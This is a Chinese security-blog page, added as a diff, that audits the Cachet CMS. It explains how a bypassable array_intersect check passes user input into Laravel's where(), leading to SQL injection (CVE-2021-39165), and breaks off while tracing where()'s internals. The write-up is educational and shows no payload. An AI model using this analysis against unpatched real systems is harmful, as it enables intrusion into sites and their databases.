@@ -1,0 +1,907 @@
+
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+  <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。">
+  <meta name="keywords" content="phith0n,网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python">
+  <link rel="shortcut icon" href="../static/cactus/images/favicon.ico">
+  <link rel="icon" type="image/png" href="../static/cactus/images/favicon-192x192.png" sizes="192x192">
+  <link rel="apple-touch-icon" sizes="180x180" href="../static/cactus/images/apple-touch-icon.png">
+  <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌"/>
+
+  <title>CVE-2021-39165: 从一个Laravel SQL注入漏洞开始的Bug Bounty之旅 | 离别歌</title>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/5.1.3/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="../static/cactus/css/style%EF%B9%96v=20220521.css">
+  
+  <link rel="stylesheet" href="../static/cactus/css/code%EF%B9%96v=20211026.css">
+  <link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+
+</head>
+<body>
+
+
+
+  <div class="sticky">
+    <a href="#" id="menu-icon" class="menu-icon active"><i class="fa fa-bars fa-lg"></i></a>
+    <div class="menu">
+      <ul>
+        <li><a href="../index.html">主页</a></li>
+        <li><a href="javascript:history.back(-1)">返回</a></li>
+      </ul>
+      <br>
+    </div>
+    <div class="clearfix"></div>
+    <div class="info" style="position: fixed">
+      <span id="i-top" style="display: none">Back to top</span>
+      <span id="i-share" style="display: none">Share post</span>
+    </div>
+    <ul class="actions">
+      <li><a class="icon" href="#" id="back-top"><i
+          class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
+          onmouseout="$('#i-top').toggle();"></i></a></li>
+      <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true"
+                                      onmouseover="$('#i-share').toggle();"
+                                      onmouseout="$('#i-share').toggle();"
+                                      onclick="$('#share').toggleClass('hidden');return false;"></i></a></li>
+    </ul>
+    <div id="share" class="hidden">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;text=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;title=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;is_video=false&amp;description=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;title=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;title=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;title=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;title=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html&amp;name=CVE-2021-39165%3A%20%E4%BB%8E%E4%B8%80%E4%B8%AALaravel%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E7%9A%84Bug%20Bounty%E4%B9%8B%E6%97%85&amp;description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <div class="article row justify-content-center min-height">
+      <div class="col-lg-8 col-md-10 col-sm-12">
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+          <header class="post-header">
+            <h1 class="color-main h1 mb-0" itemprop="name headline">CVE-2021-39165: 从一个Laravel SQL注入漏洞开始的Bug Bounty之旅</h1>
+            <div class="meta">
+              <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+                <span itemprop="name">phithon</span>
+              </span>
+
+              <div class="postdate">
+                <time datetime="2021年8月30日 10:21" itemprop="datePublished">
+                  2021 八月 30 10:21
+                </time>
+              </div>
+
+              <div class="article-tag">
+                阅读：65727
+              </div>
+
+              
+                <div class="article-tag">
+                  <i class="fa fa-bookmark"></i>
+                  <a class="tag-link" href="../sort/PENETRATION.html">网络安全</a>
+                </div>
+              
+
+              
+                <div class="article-tag">
+                  <i class="fa fa-tag"></i>
+                  
+                    <a class="tag-link" href="../tag/BugBounty.html">BugBounty</a>,
+                  
+                  
+                    <a class="tag-link" href="../tag/Laravel.html">Laravel</a>,
+                  
+                  
+                    <a class="tag-link" href="../tag/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">SQL注入漏洞</a>
+                  
+                </div>
+              
+            </div>
+          </header>
+          <div class="content" itemprop="articleBody">
+            <blockquote>
+<p>事先声明：本次测试过程完全处于本地或授权环境，仅供学习与参考，不存在未授权测试过程。本文提到的漏洞《<a href="https://github.com/fiveai/Cachet/security/advisories/GHSA-79mg-4w23-4fqc">Cachet SQL注入漏洞（CVE-2021-39165）</a>》已经修复，也请读者勿使用该漏洞进行未授权测试，否则作者不承担任何责任</p>
+</blockquote>
+<h2 id="0x01"><a class="toclink" href="#0x01">0x01 故事的起源</a></h2>
+<p>一个百无聊赖的周日晚上，我在知识星球闲逛，发现有一个匿名用户一连向我提出了两个问题：</p>
+<p><a href="../media/attachment/2021/08/29/ddc7617b-7ac3-4519-962b-fce7c81f9d50.png"><img alt="image-20210720025643830.png" src="../media/attachment/2021/08/29/ddc7617b-7ac3-4519-962b-fce7c81f9d50.c2e8d2f0e326.png" /></a></p>
+<p>本来不是很想回答这两个问题，一是感觉比较基础，二是现在大部分人都卷Java去了，关注PHP的其实不多。不过我搜索了一下自己的星球，发现我的确没有讲过如何调试PHP代码，那么回答一下这个问题也未尝不可。</p>
+<p>既然如此，我就打开自己常用的PHP IDE之一PHPStorm（另一款是VSCode），看了看硬盘里落满灰尘的PHP代码，要不就是几年前的版本要不就是没法做演示的非开源项目。如果要新写一篇教程，最好还是上网上找个新的CMS做演示。</p>
+<p>于是我打开了Github，搜索“PHP”关键字，点进了<a href="https://github.com/topics/php">PHP</a>这个话题。PHP话题下有几类开源项目，一是一些PHP框架和库，排在前面的主要是Laravel、symfony、Yii、guzzle、PHPMailer、composer等；二是CMS和网站应用，排在前面的有matomo、nextcloud、monica、Cachet等；三是一些README和教学项目，比如awesome-php、DesignPatternsPHP等。</p>
+<p>做演示自然选择开箱即用的第二类，于是我挑了一个功能常见且简单的Cachet。</p>
+<p>当天晚上我自己搭建、调试、运行起了Cachet这个CMS，并写了一篇简单的教程发在星球里：</p>
+<p><a href="../media/attachment/2021/08/29/c6236a40-0946-45a8-968c-ef63abc414a3.png"><img alt="image-20210720032613219.png" src="../media/attachment/2021/08/29/c6236a40-0946-45a8-968c-ef63abc414a3.017ee28a1021.png" /></a></p>
+<p>本来这个故事到此就结束了，但是不安分的我当时就在想，既然搭都搭起来了，那不如就对其做一遍审计吧。</p>
+<h2 id="0x02-cachet"><a class="toclink" href="#0x02-cachet">0x02 Cachet代码审计</a></h2>
+<p><a href="https://github.com/CachetHQ/Cachet">Cachet</a>是一款基于Laravel框架开发的状态页面（Statuspage）系统。Statuspage是云平台流行后慢慢兴起的一类系统，作用是向外界展示当前自己各个服务是否在正常运行。国外很多大型互联网平台都有Statuspage，最著名的有 <a href="https://www.githubstatus.com/">Github</a>、<a href="https://status.twitterstat.us/">Twitter</a>、<a href="https://status.fb.com/">Facebook</a>、<a href="https://status.aws.amazon.com/">Amazon AWS</a>等。</p>
+<p>Statuspage中占据领导地位的是<a href="https://statuspage.io/">Statuspage.io</a>，隶属于Atlassian。但毕竟这是一个付费的系统，Cachet得益于自己开源的优势，也有不少拥趸，在Github上有12k多关注。</p>
+<p>Cachet最新的稳定版本是2.3.18，基于Laravel 5.2开发，我将其拉下来安装好后开始审计。</p>
+<blockquote>
+<p>经过验证，dev版本的代码可能有所差异（主要是后台getshell部分的POC利用链不一样），本文仅基于稳定版做审计。</p>
+</blockquote>
+<p>Laravel框架的CMS审计，我主要关注下面几个点：</p>
+<ul>
+<li>网站路由</li>
+<li>控制器（app/Http/Controllers）</li>
+<li>中间件（app/Http/Middleware）</li>
+<li>Model（app/Models）</li>
+<li>网站配置（config）</li>
+<li>第三方扩展（composer.json）</li>
+</ul>
+<p>先从路由开始看起，以<code>app/Http/Routes/StatusPageRoutes.php</code>为例：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">$router</span><span class="o">-&gt;</span><span class="na">group</span><span class="p">([</span><span class="s1">&#39;middleware&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;web&#39;</span><span class="p">,</span> <span class="s1">&#39;ready&#39;</span><span class="p">,</span> <span class="s1">&#39;localize&#39;</span><span class="p">]],</span> <span class="k">function</span> <span class="p">(</span><span class="nx">Registrar</span> <span class="nv">$router</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$router</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">[</span>
+        <span class="s1">&#39;as&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;status-page&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;uses&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;StatusPageController@showIndex&#39;</span><span class="p">,</span>
+    <span class="p">]);</span>
+
+    <span class="nv">$router</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;incident/{incident}&#39;</span><span class="p">,</span> <span class="p">[</span>
+        <span class="s1">&#39;as&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;incident&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;uses&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;StatusPageController@showIncident&#39;</span><span class="p">,</span>
+    <span class="p">]);</span>
+
+    <span class="nv">$router</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;metrics/{metric}&#39;</span><span class="p">,</span> <span class="p">[</span>
+        <span class="s1">&#39;as&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;metrics&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;uses&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;StatusPageController@getMetrics&#39;</span><span class="p">,</span>
+    <span class="p">]);</span>
+
+    <span class="nv">$router</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;component/{component}/shield&#39;</span><span class="p">,</span> <span class="s1">&#39;StatusPageController@showComponentBadge&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+
+<p>其中可以看出的信息是：</p>
+<ul>
+<li>某个path所对应的Controller和方法</li>
+<li>整个模块使用的中间件</li>
+</ul>
+<p>前者比较好理解，中间件的作用通常是做权限的校验、全局信息的提取等。这个route组合用了三个中间件web、ready和localize。我们可以在app/Http/Kernel.php找到这三个名字对应的中间件类，他们的作用是：</p>
+<ul>
+<li>web是多个中间件的组合，作用主要是设置Cookie和session、校验csrf token等</li>
+<li>ready用于检查当前CMS是否有初始化，如果没有，则跳到初始化的页面</li>
+<li>localize主要用于根据请求中的Accept-Language来展示不同语言的页面</li>
+</ul>
+<p>接着我会主要关注那些不校验权限的Controller（就是没有admin和auth中间件的Controller）。我关注到了app/Http/Controllers/Api/ComponentController.php的getComponents方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="sd">/**</span>
+<span class="sd">  * Get all components.</span>
+<span class="sd">  *</span>
+<span class="sd">  * @return \Illuminate\Http\JsonResponse</span>
+<span class="sd">  */</span>
+<span class="k">public</span> <span class="k">function</span> <span class="nf">getComponents</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">app</span><span class="p">(</span><span class="nx">Guard</span><span class="o">::</span><span class="na">class</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nv">$components</span> <span class="o">=</span> <span class="nx">Component</span><span class="o">::</span><span class="na">query</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$components</span> <span class="o">=</span> <span class="nx">Component</span><span class="o">::</span><span class="na">enabled</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="nv">$components</span><span class="o">-&gt;</span><span class="na">search</span><span class="p">(</span><span class="nx">Binput</span><span class="o">::</span><span class="na">except</span><span class="p">([</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;order&#39;</span><span class="p">,</span> <span class="s1">&#39;per_page&#39;</span><span class="p">]));</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$sortBy</span> <span class="o">=</span> <span class="nx">Binput</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$direction</span> <span class="o">=</span> <span class="nx">Binput</span><span class="o">::</span><span class="na">has</span><span class="p">(</span><span class="s1">&#39;order&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">Binput</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;order&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;desc&#39;</span><span class="p">;</span>
+
+        <span class="nv">$components</span><span class="o">-&gt;</span><span class="na">sort</span><span class="p">(</span><span class="nv">$sortBy</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$components</span> <span class="o">=</span> <span class="nv">$components</span><span class="o">-&gt;</span><span class="na">paginate</span><span class="p">(</span><span class="nx">Binput</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;per_page&#39;</span><span class="p">,</span> <span class="mi">20</span><span class="p">));</span>
+
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">paginator</span><span class="p">(</span><span class="nv">$components</span><span class="p">,</span> <span class="nx">Request</span><span class="o">::</span><span class="na">instance</span><span class="p">());</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>其中有两个关键点：</p>
+<ul>
+<li><code>$components-&gt;search(Binput::except(['sort', 'order', 'per_page']));</code></li>
+<li><code>$components-&gt;sort($sortBy, $direction);</code></li>
+</ul>
+<p>sort和search方法都不是Laravel自带的Model方法，这种情况一般是自定义的scope。scope是定义在Model中可以被重用的方法，他们都以<code>scope</code>开头。我们可以在app/Models/Traits/SortableTrait.php中找到scopeSort方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">trait</span> <span class="nx">SortableTrait</span>
+<span class="p">{</span>
+    <span class="sd">/**</span>
+<span class="sd">     * Adds a sort scope.</span>
+<span class="sd">     *</span>
+<span class="sd">     * @param \Illuminate\Database\Eloquent\Builder $query</span>
+<span class="sd">     * @param string                                $column</span>
+<span class="sd">     * @param string                                $direction</span>
+<span class="sd">     *</span>
+<span class="sd">     * @return \Illuminate\Database\Eloquent\Builder</span>
+<span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">scopeSort</span><span class="p">(</span><span class="nx">Builder</span> <span class="nv">$query</span><span class="p">,</span> <span class="nv">$column</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$column</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sortable</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$query</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">orderBy</span><span class="p">(</span><span class="nv">$column</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><code>$column</code>经过了<code>in_array</code>的校验，<code>$direction</code>传入的是bool类型，这两者均无法传入恶意参数。</p>
+<p>我们再看看scopeSearch方法，在app/Models/Traits/SearchableTrait.php中：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">trait</span> <span class="nx">SearchableTrait</span>
+<span class="p">{</span>
+    <span class="sd">/**</span>
+<span class="sd">     * Adds a search scope.</span>
+<span class="sd">     *</span>
+<span class="sd">     * @param \Illuminate\Database\Eloquent\Builder $query</span>
+<span class="sd">     * @param array                                 $search</span>
+<span class="sd">     *</span>
+<span class="sd">     * @return \Illuminate\Database\Eloquent\Builder</span>
+<span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">scopeSearch</span><span class="p">(</span><span class="nx">Builder</span> <span class="nv">$query</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$search</span> <span class="o">=</span> <span class="p">[])</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$query</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">array_intersect</span><span class="p">(</span><span class="nb">array_keys</span><span class="p">(</span><span class="nv">$search</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">searchable</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$query</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="nv">$search</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Cachet在调用search时传入的是<code>Binput::except(['sort', 'order', 'per_page'])</code>，这个返回值是将用户完整的GPC输入除掉sort、order、per_page三个key组成的数组。也就是说，传入scopeSearch的这个<code>$search</code>数组的键、值都是用户可控的。</p>
+<p>不过，可见这里使用了<code>array_intersect</code>函数对<code>$search</code>数组进行判断，如果返回为false，则不会继续往下执行。</p>
+<p>大概看了一圈Cachet的代码，没有太多功能点。总结起来它的特点是：</p>
+<ul>
+<li>有一部分代码逻辑在Controller中，但其还有大量逻辑放在CommandHandler中。<ul>
+<li>“Commands &amp; Handlers”逻辑用于在Laravel中实现<a href="https://en.wikipedia.org/wiki/Command_pattern">命令模式</a></li>
+<li>这个设计模式分割了输入和逻辑操作（Source和Sink），让代码审计变得麻烦了许多</li>
+</ul>
+</li>
+<li>整站前台的功能很少，权限检查在中间件中，配置如下<ul>
+<li>前台和API中的读取操作（GET）不需要用户权限</li>
+<li>API中的写入操作（POST、PUT、DELETE）需要用户权限</li>
+<li>后台所有操作都需要用户权限</li>
+</ul>
+</li>
+<li>一些特殊操作都会经过逻辑判断，比如上文说到的两个操作，作者相对比较有安全意识</li>
+<li>Cachet默认使用<a href="https://github.com/GrahamCampbell/Laravel-Binput">Laravel-Binput</a>做用户输入，而这个库对主要是用于做安全过滤，但这个过滤操作也为后面实战中绕过WAF提供了极大帮助</li>
+</ul>
+<p>相信大家审计中经常会遇到类似情况，前台功能很少导致进展不下去，那么多看看框架部分的代码也许能发现一些问题。</p>
+<p>遇到困难不要慌，去冰箱里拿了一瓶元气森林冷静冷静，重新回来看代码。回看前面的scopeSearch方法，我突然发现了问题：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">array_intersect</span><span class="p">(</span><span class="nb">array_keys</span><span class="p">(</span><span class="nv">$search</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">searchable</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nv">$query</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">return</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="nv">$search</span><span class="p">);</span>
+</code></pre></div>
+
+<p><code>array_intersect</code>这个函数，他的功能是计算两个输入数组的<strong>交集</strong>，乍一看这里处理好像经过了校验，用户输入的数组的key如果不在<code>$this-&gt;searchable</code>中，就无法取到交集。</p>
+<p>但是可以想象一下，我的输入中只要有一个key在<code>$this-&gt;searchable</code>中，那么这里的交集就可以取到至少一个值，这个if语句就不会成立。所以，这个检查形同虚设，用户输入的数组<code>$search</code>被完整传入<code>where()</code>语句中。</p>
+<h2 id="0x03-laravel"><a class="toclink" href="#0x03-laravel">0x03 Laravel代码审计</a></h2>
+<p>熟悉Laravel的同学对<code>where()</code>应该不陌生，简单介绍一下用法。我们可以通过传入两个参数key和value，来构造一个WHERE条件：</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;dual&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="c1">// 生成的WHERE条件是：WHERE id = 1</span>
+</code></pre></div>
+
+<p>如果传入的是三个参数，则第二个参数会认为是条件表达式中的符号，比如：</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;dual&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="mi">18</span><span class="p">);</span>
+<span class="c1">// 生成的WHERE条件是：WHERE id &gt; 18</span>
+</code></pre></div>
+
+<p>当然where也是支持传入数组的，我看可以将多个条件组合成一个数组传入where函数中，比如：</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;dual&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">([</span>
+    <span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;18&#39;</span><span class="p">],</span>
+    <span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;LIKE&#39;</span><span class="p">,</span> <span class="s1">&#39;%example%&#39;</span><span class="p">]</span>
+<span class="p">]);</span>
+<span class="c1">// 生成的WHERE条件是：WHERE id &gt; 18 AND title LIKE &#39;%example%&#39;</span>
+</code></pre></div>
+
+<p>那么，思考下面三个代码在Laravel中是否可能导致SQL注入：</p>
+<ul>
+<li><code>where($input, '=', 1)</code> 当where的第一个参数被用户控制</li>
+<li><code>where('id', $input, 1)</code> 当where的第二个参数被用户控制，且存在第三个参数</li>
+<li><code>where($input)</code> 当where只有一个参数且被用户控制</li>
+</ul>
+<p>这三个代码对应着不同情况，第一种是key被控制，第二种是符号被控制，第三种是整个条件都被控制。</p>
+<p>测试的过程就不说了，经过测试，我获取了下面的结果：</p>
+<ul>
+<li>当第一个参数key可控时，传入任意字符串都会报错，具体的错误为“unknown column”，但类似反引号、双引号这样的定界符将会被转义，所以无法逃逸出field字段进行注入</li>
+<li>当第二个参数符号可控时，输入非符号字符不会有任何报错，也不存在注入</li>
+<li>当整体可控时，相当于可以传入多个key、符号和value，但经过前两者的测试，key和符号位都是不能注入的，value就更不可能</li>
+</ul>
+<p>仿佛又陷入了困境。</p>
+<p>我尝试debug进入<code>where()</code>函数看了看它内部的实现，<code>src/Illuminate/Database/Query/Builder.php</code>：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">public</span> <span class="k">function</span> <span class="nf">where</span><span class="p">(</span><span class="nv">$column</span><span class="p">,</span> <span class="nv">$operator</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$boolean</span> <span class="o">=</span> <span class="s1">&#39;and&#39;</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// If the column is an array, we will assume it is an array of key-value pairs</span>
+    <span class="c1">// and can add them each as a where clause. We will maintain the boolean we</span>
+    <span class="c1">// received when the method was called and pass it into the nested where.</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$column</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addArrayOfWheres</span><span class="p">(</span><span class="nv">$column</span><span class="p">,</span> <span class="nv">$boolean</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">// ...</span>
+    <span class="c1">// If the given operator is not found in the list of valid operators we will</span>
+    <span class="c1">// assume that the developer is just short-cutting the &#39;=&#39; operators and</span>
+    <span class="c1">// we will set the operators to &#39;=&#39; and set the values appropriately.</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">in_array</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$operator</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">operators</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+        <span class="o">!</span> <span class="nb">in_array</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$operator</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">grammar</span><span class="o">-&gt;</span><span class="na">getOperators</span><span class="p">(),</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$operator</span><span class="p">)</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$operator</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">];</span>
+    <span class="p">}</span> 
+</code></pre></div>
+
